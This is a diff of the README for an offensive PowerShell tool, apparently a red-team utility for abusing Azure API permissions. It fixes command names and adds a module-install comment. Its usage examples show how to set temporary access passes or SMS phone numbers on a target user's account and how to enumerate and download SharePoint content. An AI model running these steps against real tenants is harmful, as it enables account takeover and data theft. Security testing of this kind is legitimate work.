@@ -39,7 +39,8 @@ This script would be good to use when
 
 ```powershell
 Import-Module .\AbuseAzureAPIPermissions.ps1
-Install-Module Az
+Install-Module Az.Accounts   # only Az.Accounts is needed (not the full Az meta-module).
+                             # Already baked into the bitm-proxy Docker image — see Dockerfile.
 # login with prompt
 Get-AAATokenFromAzLogin
 # login as service principal
@@ -290,7 +291,7 @@ Set-AAAAutenMethod -TempPass
 Set-AAAUserAuthTempPass -UserId "hagrid@XXX.onmicrosoft.com"
 # Clean up
 Remove-AAAUserAuthTempPass -UserId "hagrid@XXX.onmicrosoft.com" -TempPassId "XXXX"
-Set-AAAAutenPolicy -TempPass -Disable
+Set-AAAAutenMethod -TempPass -Disable
 ```
 
 
@@ -310,7 +311,7 @@ Set-AAAAutenMethod -sms
 Set-AAAUserAuthPhone -UserId "hagrid@XXX.onmicrosoft.com" -phoneNumber "+852XXXXXXX"
 # Clean up
 Remove-AAAUserAuthPhone -UserId "hagrid@XXX.onmicrosoft.com" -phoneNumber "+852XXXXXXX"
-Set-AAAAutenPolicy -sms -Disable
+Set-AAAAutenMethod -sms -Disable
 ```
 
 
@@ -324,7 +325,7 @@ Set-AAAAutenPolicy -sms -Disable
 List details and download item from a SharePoint site
 
 ```powershell
-Get-AAASite
+Get-AAASites
 Get-AAAOneDriveFolder -SitetId "XXXX"
 Get-AAAOneDriveFolder -SitetId "XXXX" -FolderId "XXXX" -showDetails
 Get-AAAOneDriveFolder -SitetId "XXXX" -FolderId "XXXX" -recurse | Export-CSV -Encoding UFT8 Result.csv
